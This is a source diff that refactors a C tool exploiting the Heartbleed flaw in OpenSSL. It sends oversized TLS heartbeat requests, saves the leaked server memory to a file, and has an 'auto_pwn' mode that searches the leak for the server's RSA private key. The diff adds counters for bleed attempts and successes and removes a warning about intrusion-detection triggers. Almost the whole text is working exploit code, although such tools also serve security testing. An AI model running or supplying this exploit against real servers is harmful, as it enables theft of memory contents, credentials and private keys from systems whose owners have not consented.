@@ -58,6 +58,11 @@
 #pragma comment(lib, "ssleay32.lib")
 #endif
 
+#include <ctype.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdarg.h>
+
 /*
  * OpenSSL specific includes. We also define an OpenSSL internal
  * function that is normally not exposed in include files, so
@@ -68,25 +73,33 @@
 #include <openssl/err.h>
 #include <openssl/rsa.h>
 
+/*
+ * This is an internal function, not declared in headers, we we
+ * have to declare our own version
+ */
 int ssl3_write_bytes(SSL *s, int type, const void *buf_, int len);
 
 #ifndef TLS1_RT_HEARTBEAT
 #define TLS1_RT_HEARTBEAT 24
 #endif
 
-/*
- * Stand C includes
- */
-#include <ctype.h>
-#include <stdio.h>
-#include <string.h>
-#include <stdarg.h>
 
 /*
  * Use '-d' option to get more verbose debug logging while running
  * the scan
  */
 int is_debug = 0;
+
+/**
+ * Per connection data that is flushed at the end of the connection
+ */
+struct Connection {
+    struct DumpArgs *args;
+    struct {
+        unsigned attempted;
+        unsigned succeeded;
+    } heartbleeds;
+};
 
 /**
  * Arguments for the heartbleed callback function. We read these from the
@@ -103,7 +116,6 @@ struct DumpArgs {
     unsigned is_error;
     unsigned is_auto_pwn;
     unsigned is_rand_size;
-    unsigned is_sent_heartbeat;
     unsigned is_sent_good_heartbeat;
     struct {
         unsigned desired;
@@ -142,6 +154,7 @@ int DEBUG_MSG(const char *fmt, ...)
 
 
 /****************************************************************************
+ * Prints a typical hexdump, for debug purposes.
  ****************************************************************************/
 void
 hexdump(const unsigned char *buf, size_t len)
@@ -175,11 +188,12 @@ hexdump(const unsigned char *buf, size_t len)
  * the OpenSSL core to intercept them.
  ****************************************************************************/
 void 
-dump_bytes(int write_p, int version, int content_type,
+receive_heartbeat(int write_p, int version, int content_type,
             const void *vbuf, size_t len, SSL *ssl, 
             void *arg)
 {
-    struct DumpArgs *args = (struct DumpArgs*)arg;
+    struct Connection *connection = (struct Connection *)arg;
+    struct DumpArgs *args = connection->args;
     const unsigned char *buf = (const unsigned char *)vbuf;
 
     /*
@@ -204,6 +218,10 @@ dump_bytes(int write_p, int version, int content_type,
         return;
     }
 
+    /*
+     * See if this is a "good" heartbeat, which we send to probe
+     * the system in order to see if it's been patched.
+     */
     if (args->is_sent_good_heartbeat && len == 67) {
         static const char *good_response = 
             "\x02\x00\x30"
@@ -216,9 +234,6 @@ dump_bytes(int write_p, int version, int content_type,
             exit(1);
         }
     }
-
-    /* clear the "sent" flag, indicating we've received something */
-    args->is_sent_heartbeat = 0;
 
     /*
      * Inform user that we got some bleeding data
@@ -239,6 +254,9 @@ dump_bytes(int write_p, int version, int content_type,
     if (!args->fp && is_debug) {
         hexdump(buf, len);
     }
+
+    /* Count this, to verify that bleeds are working */
+    connection->heartbleeds.succeeded++;
 }
 
 
@@ -264,6 +282,8 @@ my_inet_ntop(int family, struct sockaddr *sa, char *dst, size_t sizeof_dst)
 
     return dst;
 }
+
+
 
 /****************************************************************************
  * Given two primes, generate an RSA key. From RFC 3447 Appendix A.1.2
@@ -418,6 +438,8 @@ find_private_key(const BIGNUM *n, const BIGNUM *e,
     return 0;
 }
 
+
+
 /****************************************************************************
  * After reading a chunk of data, this function will process that chunk.
  * There are three things we might do with that data:
@@ -430,10 +452,15 @@ process_bleed(struct DumpArgs *args)
 {
     size_t x;
 
+    /* ignore empty chunks */
     if (args->byte_count == 0)
         return;
+
+    /* track total bytes processed, for printing to the command-line */
     args->total_bytes += args->byte_count;
 
+    /* write a copy of the bleeding data to a file for offline processing
+     * by other tools */
     if (args->fp) {
         x = fwrite(args->buf, 1, args->byte_count, args->fp);
         if (x != args->byte_count) {
@@ -441,6 +468,7 @@ process_bleed(struct DumpArgs *args)
         }
     }
 
+    /* do a live analysis of the bleeding data */
     if (args->is_auto_pwn) {
         if (find_private_key(&args->n, &args->e, args->buf, args->byte_count)) {
             printf("key found!\n");
@@ -449,9 +477,10 @@ process_bleed(struct DumpArgs *args)
 
     }
 
-    fflush(args->fp);
     args->byte_count = 0;
 }
+
+
 
 /****************************************************************************
  * Parse details from a certificate. We use this in order to grab
@@ -490,18 +519,55 @@ parse_cert(X509 *cert, char name[512], BIGNUM *modulus, BIGNUM *e)
     }
 }
 
+
+
 /****************************************************************************
+ * Translate sockets error codes to helpful text for printing
  ****************************************************************************/
 const char *
 error_msg(unsigned err)
 {
     switch (err) {
     case WSA(ECONNRESET): return "TCP connection reset";
+    case WSA(ECONNREFUSED): return "Connection refused";
     case WSA(ETIMEDOUT): return "Timed out";
     case 0: return "TCP connection closed";
     default:   return "network error";
     }
 }
+
+
+
+/****************************************************************************
+ * Use 'select()' to see if there is incoming data on the TCP connection.
+ * This is just a typical use of select(), so that we don't block on the
+ * socket.
+ ****************************************************************************/
+unsigned
+is_incoming_data(int fd)
+{
+    int x;
+    struct timeval tv;
+    fd_set readset;
+    fd_set writeset;
+    fd_set exceptset;
+
+    FD_ZERO(&readset);
+    FD_ZERO(&writeset);
+    FD_ZERO(&exceptset);
+    FD_SET(fd, &readset);
+    FD_SET(fd, &writeset);
+    FD_SET(fd, &exceptset);
+    tv.tv_sec = 0;
+    tv.tv_usec = 1000;
+    x = select((int)fd+1, &readset, NULL, &exceptset, &tv);
+    if (x > 0)
+        return 1; /*true, there's incoming data waiting */
+    else
+        return 0; /* false, nothing has been received */
+}
+
+
 
 /****************************************************************************
  * This is the main threat that creates a TCP connection, negotiates
@@ -525,6 +591,10 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
     char port[6];
     time_t started;
     time_t last_status = 0;
+    struct Connection connection;
+
+    memset(&connection, 0, sizeof(connection));
+    connection.args = args;
 
     /*
      * Open the output/dump file.
@@ -596,7 +666,6 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
     fd = socket(addr->ai_family, SOCK_STREAM, 0);
     if (fd < 0)
         return ERROR_MSG("%u: could not create socket\n", addr->ai_family);
-
     
     
     /*
@@ -630,8 +699,8 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
     wbio = BIO_new(BIO_s_mem());
     SSL_set_bio(ssl, rbio, wbio);
     SSL_set_connect_state(ssl);
-    SSL_set_msg_callback(ssl, dump_bytes);
-    SSL_set_msg_callback_arg(ssl, (void*)args);
+    SSL_set_msg_callback(ssl, receive_heartbeat);
+    SSL_set_msg_callback_arg(ssl, (void*)&connection);
     args->is_alert = 0;
     
     
@@ -675,26 +744,10 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
             break; /* success! */
         if (x == -1 && SSL_get_error(ssl, x) == SSL_ERROR_WANT_READ) {
             char buf[16384];
-            struct timeval tv;
-            fd_set readset;
-            fd_set writeset;
-            fd_set exceptset;
 
-            FD_ZERO(&readset);
-            FD_ZERO(&writeset);
-            FD_ZERO(&exceptset);
-            FD_SET(fd, &readset);
-            FD_SET(fd, &writeset);
-            FD_SET(fd, &exceptset);
-            tv.tv_sec = 0;
-            tv.tv_usec = 1000;
-            x = select((int)fd+1, &readset, NULL, &exceptset, &tv);
-            if (x > 0) {
+            if (is_incoming_data(fd)) {
                 x = recv(fd, buf, sizeof(buf), 0);
                 if (x > 0) {
-                    if (x >= 2 && memcmp(buf, "\x18\x03", 2) == 0) {
-                        fprintf(stderr, "[-] '18 03' PACKET HEADER, POSSIBLE IDS TRIGGER\n");
-                    }
                     BIO_write(rbio, buf, x);
                 } else {
                     unsigned err = WSAGetLastError();
@@ -718,9 +771,9 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
 
 
     /*
-     * Get the peer certificate name. We do this so that we can
-     * automatically scan the heartbleed information for 
-     * private key information
+     * Get the peer certificate from the handshake. We do this so that we
+     * can automatically scan the heartbleed information for private key
+     * information
      */
     {
         X509 *cert;
@@ -751,7 +804,8 @@ again:
     }
 
     /*
-     * Print how many bytes we've downloaded on command-line
+     * Print how many bytes we've downloaded on command-line every
+     * second (to <stderr>)
      */
     if (last_status + 1 <= time(0)) {
         fprintf(stderr, "%llu bytes downloaded\r", args->total_bytes);
@@ -772,8 +826,9 @@ again:
      */
     ssl3_write_bytes(ssl, SSL3_RT_APPLICATION_DATA, 
                             http_request, (int)strlen(http_request));
-    if (args->is_sent_heartbeat) {
-        /* we've sent a heartbeat with no response, therefore try a
+    if (connection.heartbleeds.attempted > 5 
+        && connection.heartbleeds.succeeded == 0) {
+        /* we've sent a heartbleeds with no response, therefore try a
          * normal heartbeat */
         args->is_sent_good_heartbeat = 1;
         ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, 
@@ -783,8 +838,8 @@ again:
             "aaaaaaaaaaaaaaaa"
             "aaaaaaaaaaaaaaaa",
             67);
-
     } else if (args->is_rand_size) {
+        /* If configured to do so, do random sizes */
         unsigned size = rand();
         char rbuf[3];
         if (size <= 128)
@@ -793,8 +848,12 @@ again:
         rbuf[1] = (char)(size>>8);
         rbuf[2] = (char)(size>>0);
         ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, rbuf, 3);
-    } else
+        connection.heartbleeds.attempted++;
+    } else {
+        /* NORMALLY, just send a short heartbeat request */
         ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, "\x01\xff\xff", 3);
+        connection.heartbleeds.attempted++;
+    }
 
 
 
@@ -812,42 +871,35 @@ again:
             goto end;
         }
     }
-    args->is_sent_heartbeat = 1;
 
     /*
      * Wait for the response. We are actually just waiting for the normal
      * HTTP-layer response, but during the wait, callbacks to the
-     * "dump_bytes" function will happen.
+     * "receive_heartbeat" function will happen.
      */
     DEBUG_MSG("[ ] waiting for response\n");
     started = time(0);
     for (;;) {
         char buf[65536];
-        struct timeval tv;
-        fd_set readset;
 
+        /* if we can an ALERT at the SSL layer, break out of this loop */
         if (args->is_alert)
             break;
         
-        if (started + 5 < time(0))
+        /* only wait a few seconds for a response */
+        if (started + args->timeout < time(0)) {
+            DEBUG_MSG("[-] timeout waiting for response\n");
             break;
+        }
 
         /* Use 'select' to poll to see if there is data waiting for us
          * from the network */
-        FD_ZERO(&readset);
-        FD_SET(fd, &readset);
-        tv.tv_sec = 0;
-        tv.tv_usec = 1000;
-        x = select((int)fd+1, &readset, NULL, NULL, &tv);
-        if (x > 0) {
+        if (is_incoming_data(fd)) {
             x = recv(fd, buf, sizeof(buf), 0);
             if (x > 0) {
                 total_bytes += x;
                 BIO_write(rbio, buf, x);
             }
-        } else if (x < 0) {
-            ERROR_MSG("[-] socket err=%d\n", WSAGetLastError());
-            break;
         }
 
         /*
@@ -900,6 +952,8 @@ end:
     }
     return 0;
 }
+
+
 
 /****************************************************************************
  * Process the files produced by this tool, or other tools, looking for
@@ -1139,6 +1193,3 @@ usage:
         fclose(args.fp);
     return 0;
 }
-
-
-
